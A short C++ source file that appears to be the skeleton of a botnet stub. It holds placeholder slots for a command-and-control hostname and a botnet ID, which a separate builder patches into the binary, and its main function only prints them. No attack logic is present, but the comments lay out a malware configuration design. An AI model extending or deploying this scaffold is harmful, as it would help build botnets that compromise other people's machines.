#include <iostream>

#include <Windows.h>

/**
 * This section of variables is filled in by the builder when the stub is being configured
 * this is done so that users can reconfigure the stub without having access to the source 
 * code or needing to recompile it
 *
 * The reason that we are initializing these variables to generic values is so that
 * the linker has to put these variables inside of the read only data section instead
 * of placing it into the bss section of the executable
 */
extern "C" {

	/**
	 * Domain name or IP address to connect to in order to recieve commands
	 */
	extern char hostname[256] = {'H', 'O', 'S', 'T', 'N', 'A', 'M', 'E'};

	/**
	 * Since multiple botnets can be run on a single C&C server we want to support partitioning
	 * into sub-botnets and need a secondary identifier to tell to whom the bot belongs
	 */
	extern char botnetid[256] = {'B', 'O', 'T', 'N', 'E', 'T', 'I', 'D'};  
	
	/**
	 * If this constant is not changed from FALSE the stub can check and
	 * know that it has not been built by the builder and knows to exit as
	 * this is an error
	 */
	extern unsigned int built = 0;
}

int main()
{
	
	if(built != 0) {
		std::cout << "Hostname:"  << hostname << std::endl;
		std::cout << "Botnet ID:" << botnetid << std::endl;

	} else {
		std::cout << "Stub not build" << std::endl;
	}

	return 0;
}
